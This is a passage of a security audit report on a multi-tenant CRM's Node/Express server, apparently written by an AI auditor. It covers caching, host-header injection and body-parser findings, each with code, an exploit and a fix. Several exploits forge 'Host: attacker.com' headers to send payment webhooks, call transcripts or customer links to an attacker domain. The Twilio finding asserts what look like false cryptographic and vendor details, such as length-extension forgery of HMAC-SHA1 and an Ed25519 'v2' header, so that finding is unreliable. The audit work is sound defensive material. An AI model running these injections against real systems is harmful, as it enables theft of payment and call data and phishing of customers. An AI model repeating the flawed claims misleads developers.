`packages/server/src/routes/paymentLinks.routes.ts`, `packages/server/src/routes/voice.routes.ts`,
`packages/server/src/routes/ticketSignatures.routes.ts`, `packages/server/src/routes/tv.routes.ts`,
`packages/server/src/routes/estimateSign.routes.ts`, `packages/server/src/utils/signedUploads.ts`,
`packages/server/src/middleware/tenantResolver.ts`

---

### MEDIUM — QR endpoint behind authMiddleware served with Cache-Control: public

**Where:** `packages/server/src/index.ts:1307-1318`

**What:**
`GET /api/v1/qr` is protected by `authMiddleware` (line 1307), meaning the QR image is user/tenant-specific (the `data` parameter encodes ticket IDs, order IDs, or other internal data). However, the response unconditionally sets `Cache-Control: public, max-age=3600` (line 1313). Any CDN, shared corporate proxy, or caching reverse proxy placed in front of the server will store this image for up to one hour and serve it to any subsequent requester — stripping the authentication entirely for cached responses.

**Code:**
```typescript
app.get('/api/v1/qr', authMiddleware, async (req, res) => {
  const data = req.query.data as string;
  if (!data || data.length > 2000) return res.status(400).send('Invalid data');
  try {
    const png = await QRCode.toBuffer(data, { width: 200, margin: 1 });
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'public, max-age=3600');  // ← BUG: public on auth-gated endpoint
    res.send(png);
```

**Exploit:**
Attacker A (authenticated) requests `GET /api/v1/qr?data=ORDER-12345`; the CDN caches it publicly. Attacker B (unauthenticated, different tenant) requests the same URL — receives the cached QR image encoding internal order/ticket data without any authentication check.

**Fix:**
Replace with `Cache-Control: private, no-store` since QR codes are computed on-demand from user-controlled `data` and the content is never the same across users or tenants.

---

### MEDIUM — Public booking /availability served with Cache-Control: public without Vary: Host (multi-tenant cross-tenant cache poisoning)

**Where:** `packages/server/src/routes/bookingPublic.routes.ts:219`

**What:**
`GET /public/api/v1/booking/availability` responds with `Cache-Control: public, max-age=60`. In multi-tenant mode, this endpoint is mounted after `tenantResolver` (index.ts:1276, 1707), which selects the tenant DB based on the HTTP `Host` subdomain. A CDN or shared caching proxy that stores `public` responses does not vary its cache key by `Host` header unless instructed via `Vary: Host`. Without this header, the cached response for `tenant-a.example.com/public/api/v1/booking/availability?service_id=1&date=2026-05-06` can be served to requests for `tenant-b.example.com` with the same path and query — exposing tenant A's booking schedule and service IDs to tenant B's users.

**Code:**
```typescript
// packages/server/src/routes/bookingPublic.routes.ts:218-219
// Set Cache-Control after successful validation but before any DB query that could throw
res.set('Cache-Control', 'public, max-age=60');
// Missing: res.setHeader('Vary', 'Host');
```

**Exploit:**
In a multi-tenant SaaS deployment with a CDN (Cloudflare, etc.): attacker visits `tenant-a.example.com/public/api/v1/booking/availability?service_id=1&date=2026-05-06`, which gets CDN-cached. Another user visiting `tenant-b.example.com` (different Host) with the same path receives tenant A's availability data. This reveals tenant A's booking configuration and appointment availability cross-tenant.

**Fix:**
Add `res.setHeader('Vary', 'Host')` immediately after the `Cache-Control` header, or switch to `Cache-Control: private, max-age=60` which prevents shared caching altogether. The same change is needed for `GET /public/api/v1/booking/config` which also returns tenant-specific data (store name, phone, services) but sets no `Cache-Control` at all — relying on the global `private, no-cache` default only for `/api/v1/*` prefixed paths (line 1252-1259), which does NOT apply to `/public/api/v1/*`.

---

### LOW — /public/api/v1/booking/config has no Cache-Control header (falls through global middleware that only covers /api/v1/*)

**Where:** `packages/server/src/routes/bookingPublic.routes.ts:112-192` and `packages/server/src/index.ts:1252-1259`

**What:**
The global cache-control middleware at index.ts:1252 only fires for the `/api/v1` mount prefix — it sets `private, no-cache` for all GET requests under that prefix. The booking config endpoint is mounted at `/public/api/v1/booking` (index.ts:1707), so the prefix is `/public/api/v1/`, which the middleware never matches. The endpoint returns tenant-specific data (store name, phone, booking services list, hours, exception dates) without any `Cache-Control` header. Express then falls through to the default `ETag`-based caching (`etag: weak`, line 636), which means a CDN or shared proxy can cache tenant-specific configuration data indefinitely under a permissive default policy.

**Code:**
```typescript
// index.ts:1252–1259 — does NOT match /public/api/v1/*
app.use('/api/v1', (req, _res, next) => {
  const isPii = PII_PATH_PREFIXES.some(...)
  if (isPii) {
    _res.setHeader('Cache-Control', 'private, no-store, max-age=0');
  } else if (req.method === 'GET') {
    _res.setHeader('Cache-Control', 'private, no-cache');
  }
  next();
});
// /public/api/v1/booking/config → no Cache-Control header set
```

**Exploit:**
A CDN with `default-ttl` rules caches the unguarded `/public/api/v1/booking/config` response for tenant A. Requests for the same path from a different tenant (different `Host` but same URL path) receive stale cross-tenant data until the CDN TTL expires.

**Fix:**
Extend the cache-control middleware to also cover `/public/api/v1` paths, or add an explicit `Cache-Control: public, max-age=60, Vary: Host` to `GET /config` similar to `GET /availability`. A simpler fix: apply `res.set('Cache-Control', 'public, max-age=60')` + `res.setHeader('Vary', 'Host')` inside the `/config` handler.

---

### LOW — Signed-URL file endpoint (/signed-url/*) serves sensitive uploads with no Cache-Control header

**Where:** `packages/server/src/index.ts:1358-1394`

**What:**
The signed-URL endpoint serves customer PII files (MMS photos, recording audio, bench/shrinkage images, receipt attachments) to unauthenticated callers whose authenticity is established solely by the HMAC signature and `exp` timestamp. The handler calls `res.sendFile(resolved)` with no `Cache-Control` header (line 1389). Express will emit `ETag` + `Last-Modified` for file responses by default (Node `fs.stat` populates these). A browser or proxy that receives `ETag` and no explicit `no-store` will cache the file and may re-serve it without re-verifying the signature, including after the signature has expired. An attacker who obtains a short-lived signed URL could re-request from a warm browser cache after `exp` without triggering a server-side signature check.

**Code:**
```typescript
// index.ts:1389
res.sendFile(resolved, (err) => {  // ← no Cache-Control set; ETag auto-emitted
  if (err && !res.headersSent) {
    res.status(404).json({ success: false, message: 'File not found' });
  }
});
```

**Exploit:**
Attacker obtains a 1-hour signed URL for a customer photo. The URL is delivered in an email and opened in a browser which caches the response (browser stores ETag). After the `exp` passes (signature expired), the attacker re-navigates to the URL. The browser sends an `If-None-Match` conditional GET; if the server processes it (etag match → 304), the cached sensitive content remains accessible from browser disk cache without an updated signature. At minimum the browser cache continues serving the stale file until evicted.

**Fix:**
Add `res.setHeader('Cache-Control', 'private, no-store')` before the `res.sendFile` call so browsers and proxies never cache the content at all, consistent with the intent of time-limited signed URLs. Alternatively set `max-age` to equal the remaining TTL so the cache entry automatically expires when the signature does: `res.setHeader('Cache-Control', \`private, max-age=${Math.max(0, exp - Math.floor(Date.now()/1000))}\`)`.

---

### LOW — /admin HTML and /super-admin SPA index.html served with no Cache-Control: no-store

**Where:** `packages/server/src/index.ts:1782-1788` (admin) and `packages/server/src/index.ts:1510-1526` (super-admin SPA)

**What:**
`GET /admin` sends `admin/index.html` with only a custom CSP header — no `Cache-Control` header is set (line 1787). Similarly, `GET /super-admin` and `GET /super-admin/*` send the SPA `index.html` with only a CSP header set on an outer middleware (line 1502) but no `Cache-Control`. Express's `res.sendFile` will auto-generate `ETag` + `Last-Modified`. A browser may cache the admin HTML. After the operator logs out and the admin session is invalidated, if the browser's back button or cache serves the prior HTML, the admin panel UI remains visible to a local observer (e.g. shared workstation), and subsequent JavaScript execution may re-use cached resources. For `/super-admin` this is particularly relevant since it is localhost-only but multiple users may share the machine.

**Code:**
```typescript
// index.ts:1782–1788
app.get('/admin', (req, res) => {
  if (config.multiTenant && req.tenantSlug) {
    return res.status(403).send('...');
  }
  res.setHeader('Content-Security-Policy', adminCsp);
  res.sendFile(path.resolve(__dirname, 'admin/index.html'));  // ← no Cache-Control
});
// index.ts:1510–1526 — same pattern for /super-admin
```

**Exploit:**
Operator logs into admin panel on a shared workstation, performs work, logs out. A second user clicks browser back or opens browser history — cached `admin/index.html` loads, revealing the admin UI shell. If the SPA re-hydrates using cached JS bundles and the old session cookie is still in the jar (e.g., tab was not fully closed), partial admin access may persist.

**Fix:**
Add `res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private')` before the `res.sendFile` call for both the `/admin` and `/super-admin/*` handlers, mirroring the pattern already used for the portal-enrich v2 and payment-links public routes.

---

### INFO — widget.js served public without Vary: Host in multi-tenant mode

**Where:** `packages/server/src/routes/portal.routes.ts:1613-1623`

**What:**
`GET /api/v1/portal/widget.js` sets `Cache-Control: public, max-age=300` with no `Vary` header. In multi-tenant mode, the widget script content is identical across tenants (it's a static function). However, the script's runtime behavior uses `data-server` to point to a tenant subdomain. If a CDN caches the response and serves it cross-tenant, the cached copy is functionally safe because the script itself contains no per-tenant secrets. This is an INFO-level observation since the content is static, but it should be reviewed if the widget ever becomes tenant-parameterized.

**Code:**
```typescript
router.get('/widget.js', (_req: Request, res: Response) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=300');  // no Vary: Host
  res.send(getWidgetScript());
});
```

**Exploit:**
No immediate exploit since the widget script is tenant-agnostic static content. If ever parameterized (e.g., embed tenant name or API keys), the missing `Vary: Host` would cause cross-tenant script poisoning.

**Fix:**
Add `res.setHeader('Vary', 'Host')` as a precautionary measure now, before any tenant-parameterization work is done.

---

### INFO — CORS `Access-Control-Max-Age` not explicitly set; browser default allows 5s preflight caching

**Where:** `packages/server/src/index.ts:1105-1128`

**What:**
The `cors()` middleware is called without a `maxAge` option (line 1105). The npm `cors` library does not emit an `Access-Control-Max-Age` header when `maxAge` is not configured. Per the Fetch spec, when no `Access-Control-Max-Age` is present browsers use a default of 5 seconds before re-sending preflights. This means CORS allowlist changes (e.g., removing a compromised origin) take effect immediately on new requests without a window of cached-stale-allowlist exposure. The current behavior is actually secure by default. Noting as INFO because the absence of the header is intentional but worth documenting as a known behavior rather than an oversight.

**Code:**
```typescript
app.use(cors({
  origin: (origin, callback) => {
    if (!origin) { return callback(null, true); }
    if (isCorsOriginAllowed(origin)) { return callback(null, true); }
    logCorsRejection(origin);
    callback(new Error(`CORS not allowed: ${origin} ...`));
  },
  credentials: true,
  // maxAge: not set — browser default 5s applies
}));
```

**Exploit:**
None from omission. A long `Access-Control-Max-Age` (e.g., 86400s) would be the vulnerability — stale CORS caches would serve the old allowlist. The current unset behavior is correct.

**Fix:**
Consider adding `maxAge: 600` (10 minutes) explicitly for documentation purposes and to provide a bounded cache window that is both performant and quickly invalidated after policy changes.

---

## Summary

| SEV | Count | Title |
|-----|-------|-------|
| MEDIUM | 2 | QR endpoint public cache; booking multi-tenant Vary gap |
| LOW | 3 | booking/config missing Cache-Control; signed-URL no-store gap; admin HTML no-store |
| INFO | 2 | widget.js Vary gap; CORS maxAge implicit |


---

# T07-open-redirect

# T07 — Open Redirect / Unsafe Redirect Targets

Audited: 2026-05-06
Auditor: Claude Sonnet 4.6 (T07 slot)
Scope: `packages/server/src/` — all `res.redirect` calls, `Location:` header writes, host-derived URL construction in auth/signup/billing/voice/estimateSign/admin/notifications routes, OAuth callback URL building, Stripe success/cancel URL construction, BlockChyp callbackUrl.

---

### HIGH — Host-header injection into BlockChyp callbackUrl (unauthenticated public endpoint)

**Where:** `packages/server/src/routes/paymentLinks.routes.ts:386-388`

**What:**
The public `/api/v1/public/payment-links/:token/pay` endpoint (no auth required) reads `X-Forwarded-Host` directly from `req.headers`, bypassing the `trustedProxyIps` gate enforced by `tenantResolver.ts`. An unauthenticated attacker submitting a `POST` with `X-Forwarded-Host: attacker.com` causes the server to register `https://attacker.com/api/v1/public/payment-links/<token>/paid-callback` as the BlockChyp webhook destination. BlockChyp will then POST payment-completion events (including card-last-four, transaction status, amount) to the attacker's server.

**Code:**
```typescript
// paymentLinks.routes.ts:386-388
const protocol = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
const callbackUrl = `${protocol}://${host}/api/v1/public/payment-links/${encodeURIComponent(token)}/paid-callback`;
// callbackUrl is then passed directly to BlockChyp's sendPaymentLink API
const result = await createPaymentLink(req.db, dollars, description, callbackUrl);
```

**Exploit:**
`POST /api/v1/public/payment-links/<valid_token>/pay` with headers `X-Forwarded-Host: attacker.com` and `X-Forwarded-Proto: https`. BlockChyp registers `https://attacker.com/…/paid-callback` as the payment-complete hook; when the customer pays, BlockChyp POSTs the transaction receipt (including partial card data and amount) to the attacker.

**Fix:**
Derive the callback URL from `config.baseDomain` (same pattern as `billing.routes.ts`'s `validateBaseDomain`) or from `req.tenantSlug + config.baseDomain`, never from `req.headers`. Delete the `x-forwarded-host` / `x-forwarded-proto` reads in this handler.

---

### MEDIUM — Host-header injection into voice-call callback URL (authenticated, production)

**Where:** `packages/server/src/routes/voice.routes.ts:131`

**What:**
In production (`config.nodeEnv === 'production'`) the authenticated `POST /api/v1/voice/call` handler builds `callbackBaseUrl` from `req.get('host')` without validation. Any tenant staff member with the `voice/call` permission can inject a forged `Host:` header, causing the telephony provider (Twilio/Telnyx/Plivo/Bandwidth/Vonage) to POST call status, recording notifications, and transcription results to an attacker-controlled URL. These webhooks carry caller IDs, recording URLs, and in the case of transcription, full call transcripts.

**Code:**
```typescript
// voice.routes.ts:130-132 (POST /voice/call — auth required)
const callbackBaseUrl = config.nodeEnv === 'production'
  ? `https://${req.get('host')}`          // <-- unvalidated Host header in prod
  : `https://${lanIp}:${config.port}`;
// callbackBaseUrl is passed to provider.initiateCall() which registers it
// as the TwiML/status/recording/transcription callback URL with the provider.
```

**Exploit:**
An authenticated staff member sends `POST /api/v1/voice/call` with `Host: attacker.com`. The telephony provider registers `https://attacker.com/api/v1/voice/…` as webhook URLs; subsequent call status updates and recording-ready events (with presigned recording URLs or transcript text) are delivered to the attacker rather than this server.

**Fix:**
Replace `req.get('host')` with `req.tenantSlug ? \`${req.tenantSlug}.${config.baseDomain}\` : config.baseDomain`. No user-supplied header should influence provider callback registration.

---

### MEDIUM — Host-header injection into estimate e-sign URL returned to caller

**Where:** `packages/server/src/routes/estimateSign.routes.ts:188`

**What:**
`buildPublicSignUrl()` builds the customer-facing URL from `req.get('host')` without validation. This URL is returned in the JSON response body of `POST /api/v1/estimates/:id/issue-sign-url` (admin/manager auth required). The caller (staff) typically copies this URL and sends it to the customer via email or SMS outside the app. If an attacker with staff credentials (or a compromised staff browser) sends a request with a spoofed `Host:` header, the returned sign URL points to an attacker-controlled domain, enabling a phishing attack on the customer asked to sign the estimate.

**Code:**
```typescript
// estimateSign.routes.ts:185-189
function buildPublicSignUrl(req: Request, rawToken: string): string {
  const proto = req.protocol || 'https';
  const host = req.get('host') || `localhost:${config.port}`;  // <-- no validation
  return `${proto}://${host}/public/api/v1/estimate-sign/${encodeURIComponent(rawToken)}`;
}
```

**Exploit:**
Attacker (compromised staff account) sends `POST /api/v1/estimates/42/issue-sign-url` with `Host: attacker.com`. The response contains `{"url":"https://attacker.com/public/api/v1/estimate-sign/<token>"}`. Staff pastes this into a customer email. Customer clicks, lands on attacker page; attacker can harvest the customer's signature or identity info.

**Fix:**
Replace `req.get('host')` with `req.tenantSlug ? \`${req.tenantSlug}.${config.baseDomain}\` : config.baseDomain`. The tenant context is always available in authed routes via `req.tenantSlug`.

---

### MEDIUM — Host-header injection into account-termination warning email

**Where:** `packages/server/src/routes/admin.routes.ts:231-233`
Also: `packages/server/src/services/tenantTermination.ts:161,545`

**What:**
The `POST /api/v1/admin/terminate-tenant` (action: `request`) endpoint builds `appUrl` from `req.protocol` + `req.get('host')` and passes it to `requestTermination()`, which embeds it in an HTML email sent to the tenant's admin address as a "rotate your password here" link. A malicious admin (or CSRF on an admin session) can forge the `Host:` header so the warning email urges the admin to visit an attacker's site to "rotate their password".

**Code:**
```typescript
// admin.routes.ts:231-233
const proto = req.protocol;
const host = req.get('host') || `${req.tenantSlug}.${config.baseDomain}`;
const appUrl = `${proto}://${host}`;  // embedded verbatim in termination email
```

**Exploit:**
Admin triggers step-1 termination with `Host: attacker.com`. The warning email sent to the same admin reads: "If this was NOT you, rotate your password immediately: [https://attacker.com]". If the admin actually clicks that link (believing it's legitimate), they land on the attacker's credential-harvesting page.

**Fix:**
Replace the `req.get('host')` with `req.tenantSlug + '.' + config.baseDomain`. The tenant slug is already on the request object; use it.

---

### MEDIUM — Host-header injection into receipt email/SMS tracking URL

**Where:** `packages/server/src/routes/notifications.routes.ts:279-283` and `:439-446`

**What:**
Both `POST /notifications/send-receipt` (email) and `POST /notifications/send-receipt-sms` use `req.get('host')` unvalidated to build the tracking URL embedded in customer-facing receipts. Requires authenticated manager/admin. A staff member with the right role and a forged `Host:` header can cause a spoofed tracking URL to appear in customer receipt emails and SMS messages, redirecting customers to an attacker-controlled page.

**Code:**
```typescript
// notifications.routes.ts:280 (and :439)
const publicHost = `${req.protocol}://${req.get('host')}`;  // no validation
let trackingUrl: string | null = null;
if (linkedTicket?.tracking_token) {
  trackingUrl = `${publicHost}/track?token=${encodeURIComponent(linkedTicket.tracking_token)}`;
}
// trackingUrl appears as a clickable link in the email HTML and verbatim in the SMS body
```

**Exploit:**
Staff member (or compromised session) sends `POST /api/v1/notifications/send-receipt` with `Host: attacker.com`. Customer receives a legit-looking receipt email with a "View Online" link pointing to `https://attacker.com/track?token=<token>` — attacker can harvest the token or serve malicious content.

**Fix:**
Build `publicHost` from `config.baseDomain` and `req.tenantSlug`, not from `req.get('host')`.

---

### LOW — `effectiveBaseDomain` single-label strip only: deep subdomain bypass

**Where:** `packages/server/src/routes/signup.routes.ts:161-170`

**What:**
`effectiveBaseDomain` strips exactly ONE label (the first dot-delimited label) then tests the remainder against `TRUSTED_BASE_HOSTS`. If an attacker sends `Host: attacker.bizarrecrm.com.attacker2.com` (two dots before the trusted suffix), only one label (`attacker`) is stripped and the remainder (`bizarrecrm.com.attacker2.com`) is not in the trusted set, so the function correctly falls back to `config.baseDomain`. However the function also returns the raw `rawHost` when the hostNoPort is already in `TRUSTED_BASE_HOSTS`. Because `TRUSTED_BASE_HOSTS` includes `localhost`, an attacker can send `Host: localhost` and bypass the subdomain-strip path entirely, getting back `localhost` (raw) as the effective domain — which is the intended behaviour for dev. This is not exploitable as a real open redirect because the trust check explicitly allows `localhost`. Documented here as a hardening observation.

**Code:**
```typescript
// signup.routes.ts:158-159
if (TRUSTED_BASE_HOSTS.has(hostNoPort)) return rawHost; // keep port suffix for dev
```

**Exploit:**
No direct exploitable redirect. In production, `localhost` won't resolve to an attacker host. The risk is environmental: if a staging or CI deployment exposes the signup endpoint on `localhost` with a known SMTP server, a social-engineering campaign could exploit the `localhost` trust but this requires physical/network access.

**Fix:**
In production (`config.nodeEnv === 'production'`), do not allow `localhost` or `127.0.0.1` as trusted base hosts — use only `config.baseDomain`. Guard with: `if (config.nodeEnv === 'production' && (hostNoPort === 'localhost' || hostNoPort === '127.0.0.1')) return config.baseDomain;` before the trust check.

---

### INFO — `res.redirect` HTTP→HTTPS in index.ts reads raw `Host:` but sanitizes it

**Where:** `packages/server/src/index.ts:692-715, 854-858`

**What:**
The HTTPS-upgrade middleware and the raw-HTTP redirect server both read `req.headers.host` but pass it through `sanitizeRedirectHost()` (which validates against `config.baseDomain` and its subdomains) and `sanitizeRedirectUrl()` (which rejects `//`-relative and non-path URLs). These paths are well-defended and not exploitable.

**Code:**
```typescript
// index.ts:692-703 — sanitizeRedirectHost
function sanitizeRedirectHost(rawHost: string): string {
  const noCrlf = rawHost.replace(/[\r\n\0]/g, '').split(':')[0].toLowerCase();
  if (!/^[a-zA-Z0-9.-]+$/.test(noCrlf) || noCrlf.length > 253) return config.baseDomain;
  if (noCrlf === 'localhost' || noCrlf === '127.0.0.1') return noCrlf;
  if (noCrlf === config.baseDomain) return noCrlf;
  if (noCrlf.endsWith('.' + config.baseDomain)) return noCrlf;
  return config.baseDomain;  // untrusted host → safe fallback
}
```

**Exploit:**
Not exploitable. Documented as confirmation that the HTTPS-upgrade redirect paths are correctly handled, unlike the routes above.

**Fix:**
No change required. This is the correct pattern; the above findings should adopt the same approach.

---

### INFO — Password-reset email URL uses `config.baseDomain` (correctly hardened)

**Where:** `packages/server/src/routes/auth.routes.ts:1741-1743`

**What:**
`POST /forgot-password` correctly uses `config.baseDomain` (not any request header) to build the password-reset URL, per SEC-H7 comment. This is the correct pattern. Documented as confirmation.

**Code:**
```typescript
// auth.routes.ts:1741-1743
const tenantSlug = (req as any).tenantSlug || null;
const host = tenantSlug ? `${tenantSlug}.${config.baseDomain}` : config.baseDomain;
const resetUrl = `https://${host}/reset-password/${resetToken}`;
```

**Exploit:**
Not exploitable. Host-header injection is explicitly blocked here.

**Fix:**
No change. This is the reference implementation; routes T07-F1 through T07-F4 above should follow this same pattern.

---

## Scope Cleared

The following surfaces were checked and found safe or not applicable:

- **Login `?return=` / `?next=` open redirect:** No query-parameter-driven redirects exist in `auth.routes.ts`. The only `res.redirect` calls in `signup.routes.ts` redirect to URLs built from `effectiveBaseDomain()` (validated against `TRUSTED_BASE_HOSTS`) + a hardcoded path, never from query params.
- **OAuth `redirect_uri` allowlist:** `import.routes.ts:1457,1494` builds `redirectUri` from `req.get('host')`, but this URI is used as a parameter to the *RepairDesk* OAuth server (not a local redirect). The server itself never performs a `res.redirect` to this URI; it only passes it to the third party for token exchange. Risk is credential-exfil to an attacker-controlled OAuth flow if the Host header is spoofed — covered by this slot's host-header findings above.
- **Stripe `success_url` / `cancel_url`:** `services/stripe.ts:485-486` — both URLs are built from `baseUrl`, which is set in `billing.routes.ts:39` using `config.baseDomain` (not request headers). Not exploitable.
- **`javascript:` / `data:` scheme redirect:** No `res.redirect` anywhere in the codebase accepts a user-supplied URL value. All redirect targets are either hardcoded paths, or composed from `config.baseDomain`. No `javascript:` / `data:` scheme injection possible through `res.redirect`.
- **Protocol-relative `//attacker.com` redirect:** `sanitizeRedirectUrl()` in `index.ts:710` explicitly rejects strings starting with `//`. No other redirect path accepts user-supplied paths.
- **Booking / logout redirect with `?next=`:** No such parameters exist in `bookingPublic.routes.ts` or any logout route. The booking public routes have no redirect calls at all.
- **Voice recording `res.redirect`:** Calls `validateRecordingUrl()` first (allowlist of Twilio/Telnyx/Plivo/Bandwidth/Vonage hostnames, HTTPS-only, no IP literals). Not exploitable via stored recording URL injection.


---

# T08-http-proxy

# T08 — HTTP Request Smuggling / Proxy / Body Parser / Cluster

**Scope:** `packages/server/src/index.ts`, `packages/server/src/middleware/*`, all webhook endpoints (Stripe, Twilio, Telnyx, Vonage, Plivo, Bandwidth, Voice), `ecosystem.config.js`, `packages/server/package.json`.

**Methodology:** Full read of `index.ts` end-to-end (3,900+ lines in segments), every SMS/voice provider in `providers/sms/*.ts`, `routes/billing.routes.ts`, `routes/voice.routes.ts`, `routes/sms.routes.ts`, `middleware/localhostOnly.ts`, `middleware/tenantResolver.ts`, `config.ts`, `ecosystem.config.js`, `package.json`, `package-lock.json`, `node_modules/body-parser/lib/read.js` (decompression limit path), and cross-checked all Express body parser registrations against route order.

---

### HIGH — Unauthenticated 10 MB body buffering on `/api/v1/catalog/bulk-import`

**Where:** `packages/server/src/index.ts:1222–1225` (body parser carve-out) and `packages/server/src/index.ts:1181–1208` (rate limiter) and `packages/server/src/routes/catalog.routes.ts:419` (adminOnly gate)

**What:**
The per-route `express.json({ limit: '10mb' })` parser for `POST /api/v1/catalog/bulk-import` is registered at line 1222, which is BEFORE the global `express.json({ limit: '1mb' })` at line 1228 and — critically — BEFORE the `authMiddleware` that is only applied when the catalog router is mounted at line 1661 (`app.use('/api/v1/catalog', authMiddleware, catalogRoutes)`). Any HTTP request to this path hits the 10 MB body parser immediately, regardless of authentication. The API rate limiter runs before the body parser (as designed), but the rate limit is 300 req/min globally per IP — at 300 × 10 MB = 3 GB per minute that must be buffered in Node process memory before the 401 or 403 response is emitted. No per-IP body-size accounting exists.

**Code:**
```typescript
// index.ts:1222 — body parser registered with no auth, no smaller limit guard
app.post(
  '/api/v1/catalog/bulk-import',
  express.json({ limit: '10mb' }),
);

// index.ts:1661 — authMiddleware only attached here, after the body parser above
app.use('/api/v1/catalog', authMiddleware, catalogRoutes);

// catalog.routes.ts:419 — adminOnly check only fires inside the route handler
router.post('/bulk-import', adminOnly, asyncHandler(async (req, res) => { ... }));
```

**Exploit:**
An unauthenticated attacker sends 300 POST requests per minute with 10 MB bodies (content-type: `application/json`) to `/api/v1/catalog/bulk-import`. Each request is buffered into heap before auth is checked. 300 × 10 MB = 3 GB heap pressure per minute from a single IP; with multiple IPs or proxies the rate limit is per-IP so the aggregate is unbounded. Node OOM-kills or swap-storms the server.

**Fix:**
Add `authMiddleware` (and `adminOnly` if desired at the per-route level) directly into the route carve-out stack before the body parser: `app.post('/api/v1/catalog/bulk-import', authMiddleware, express.json({ limit: '10mb' }))`. This ensures unauthenticated requests never reach the parser. Alternatively, place a shared body-size guard that rejects Content-Length > 1 MB for non-admin tokens before the per-route 10 MB parser fires.

---

### MEDIUM — Twilio webhook HMAC-SHA1 with no upgrade path to Ed25519 / v2 signing

**Where:** `packages/server/src/providers/sms/twilio.ts:101`

**What:**
The Twilio webhook signature verification implementation uses `crypto.createHmac('sha1', this.authToken)`. Twilio deprecated their v1 HMAC-SHA1 scheme and introduced Webhook Signing V2 (Ed25519) in 2021. HMAC-SHA1 is cryptographically weak (SHA-1 is broken for collision resistance) and uses the same `authToken` credential that also authenticates outbound API calls — a compromised authToken value defeats both. There is no configuration option to use the newer `X-Twilio-Signature` Ed25519 path, and no code comment acknowledging the deprecation or future migration plan.

**Code:**
```typescript
// twilio.ts:88–111
verifyWebhookSignature(req: any): boolean {
  const signature = req.headers['x-twilio-signature'];
  if (!signature) return false;
  const url = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
  const params = req.body || {};
  // ... sort and concat params ...
  const expected = crypto.createHmac('sha1', this.authToken) // ← SHA-1
    .update(data)
    .digest('base64');
  // ...
}
```

**Exploit:**
An attacker who has performed a SHA-1 length-extension attack (feasible with multi-block payloads) or has access to previously valid `X-Twilio-Signature` values from logged/intercepted traffic can potentially forge a signature accepted by this verifier. More practically: authToken leakage (e.g. via DB dump, logs) compromises both outbound API calls and allows forging inbound webhooks — injecting fake SMS/call events, triggering MMS downloads to arbitrary URLs, and poisoning conversation history for all tenants sharing this provider.

**Fix:**
Upgrade to Twilio's v2 webhook signing (Ed25519, `X-Twilio-Signature-Algorithm: SHA256-ECDSA`) and verify via `req.headers['x-twilio-signature-v2']`. Twilio SDK's `validateRequestWithBody` / `validateRequest` methods handle this automatically. If staying on HMAC-SHA1, ensure authToken is never logged and is stored only in the encrypted `store_config` path; this doesn't fix the cryptographic weakness but limits blast radius.

---

### MEDIUM — `express.urlencoded()` has no `verify` callback — rawBody unavailable for form-encoded webhooks

**Where:** `packages/server/src/index.ts:1233`

**What:**
The global `express.json()` parser at line 1228 captures `req.rawBody` via its `verify` callback. The `express.urlencoded()` parser at line 1233 has no `verify` callback — any webhook that arrives with `Content-Type: application/x-www-form-urlencoded` (Twilio SMS/voice, Plivo) will NOT have `req.rawBody` populated. The current Twilio and Plivo implementations happen to work because they verify signatures using `req.body` (parsed key-value pairs) rather than raw bytes. However: (1) future webhook providers or content-type variants relying on rawBody will fail silently, (2) any existing provider sending form-encoded JSON with a body-hash scheme (e.g. a custom Vonage configuration) will silently fail verification and reject all real webhooks, and (3) the discrepancy is a maintenance trap — any developer adding signature verification to a form-encoded webhook path will check for `req.rawBody` (consistent with other paths in the codebase) and not notice that it's always `undefined`.

**Code:**
```typescript
// index.ts:1228–1233
app.use(express.json({
  limit: '1mb',
  verify: (req: any, _res, buf) => { req.rawBody = buf; }, // ← captures rawBody
}));
// No verify callback — rawBody is NEVER set for URL-encoded bodies
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
```

**Exploit:**
A developer adds a new form-encoded webhook provider or extends Twilio/Plivo webhook verification to use raw bytes (e.g. to prevent `req.body` key normalization from bypassing the HMAC). The `req.rawBody` check silently returns `undefined` (not a crash), so the provider's `verifyWebhookSignature` returns `false`, and every real webhook is rejected with 403 — causing silent loss of all inbound SMS, voice status updates, or delivery receipts for that provider.

**Fix:**
Add a `verify` callback to the `express.urlencoded()` registration identical to the JSON one:
```typescript
app.use(express.urlencoded({
  extended: true,
  limit: '1mb',
  verify: (req: any, _res, buf) => { req.rawBody = buf; },
}));
```

---

### LOW — `httpsServer.maxHeadersCount` unset — relies on Node default

**Where:** `packages/server/src/index.ts:679–682`

**What:**
The HTTPS server is created at line 679 with `requestTimeout`, `headersTimeout`, and `keepAliveTimeout` explicitly set, but `maxHeadersCount` is left at its Node.js default of `null`. In Node.js 22, `null` means the count is governed only by `--max-http-header-size` (default: 16 KB total header block size). While 16 KB limits the memory per request, it doesn't bound the number of individual headers — an attacker can send hundreds of tiny headers that consume parsing CPU time disproportionate to the 16 KB budget. Setting an explicit `maxHeadersCount` (e.g. 50–100) would add defense-in-depth against header-count-based DoS even with small header values.

**Code:**
```typescript
// index.ts:679–682
const httpsServer = createHttpsServer(tlsOptions, app);
httpsServer.requestTimeout = 40_000;
httpsServer.headersTimeout = 45_000;
httpsServer.keepAliveTimeout = 65_000;
// maxHeadersCount not set — defaults to null (unlimited count, only total-size bounded)
```

**Exploit:**
An attacker sends requests containing 100+ tiny, unique headers. Each request stays within the 16 KB size limit but forces Node's HTTP parser to allocate and hash-compare 100 header name/value pairs per request. Combined with a high connection rate, this can degrade throughput on the event loop for parsing-heavy phases even within the rate limit window.

**Fix:**
Add `httpsServer.maxHeadersCount = 100;` (or a similar reasonable bound) immediately after the server is created. HTTP/1.1 well-behaved clients rarely send more than 20–30 headers; 100 is permissive while capping malicious oversending.

---

### INFO — No HTTP/2 (CVE-2023-44487 / Rapid Reset not applicable)

**Where:** `packages/server/src/index.ts:679`

**What:**
The server uses Node's built-in `https.createServer()` — plain HTTP/1.1 with TLS. No HTTP/2 (`spdy`, `http2.createSecureServer`) is used. CVE-2023-44487 (HTTP/2 Rapid Reset attack) is therefore not applicable to this codebase.

---

### INFO — Express 4.22.1 — not affected by CVE-2024-29041 (open redirect)

**Where:** `packages/server/package.json:29`

**What:**
